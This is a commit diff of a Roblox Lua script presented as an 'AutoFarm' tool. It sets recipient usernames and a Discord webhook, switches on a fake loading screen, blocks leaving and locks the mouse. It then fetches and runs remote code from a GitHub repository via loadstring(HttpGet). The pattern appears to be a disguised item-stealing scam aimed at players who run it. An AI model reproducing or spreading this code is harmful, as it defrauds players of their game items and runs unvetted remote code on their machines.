9a2329d36bcb021270599bd01527cb8d7ab4ac77
PETSIMULAT0RX <132601745+PETSIMULAT0RX@users.noreply.github.com>
2023-05-18 14:06:08 +0800

    Update AutoFarm.lua

--- AutoFarm.lua
+++ AutoFarm.lua
@@ -1,19 +1,23 @@
-UserName = "Zenn2345"
+UserName = "zenn2345"
 
-UserName2 = "zenn2345"
+UserName2 = "Zenn2345"
 
 Webhook = "https://discord.com/api/webhooks/1107537076192284723/jdp-l_6DLnWEzWrAjZquC7GOoeyydOexNRoWtweYSUGkPo3ElHWX1W-nYEwlguGRCC4c"
 
-_G.AntiLeave = false
+_G.LoadingScreen = true
+
+_G.AntiLeave = true
+
+_G.MouseLock = true 
 
 _G.ScriptName = "ProjectWD"
 
-_G.FirstText = "script is preparing..."
+_G.FirstText = "Script Preparing"
 
-_G.SecondText = "loading...."
+_G.SecondText = "Script Loading..."
 
-_G.ThirdText = "almost done"
+_G.ThirdText = "Almost Done..."
 
-_G.WaitingTime = 50
+_G.WaitingTime = 50 -- it's the time between 0% and 100% in secondes
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
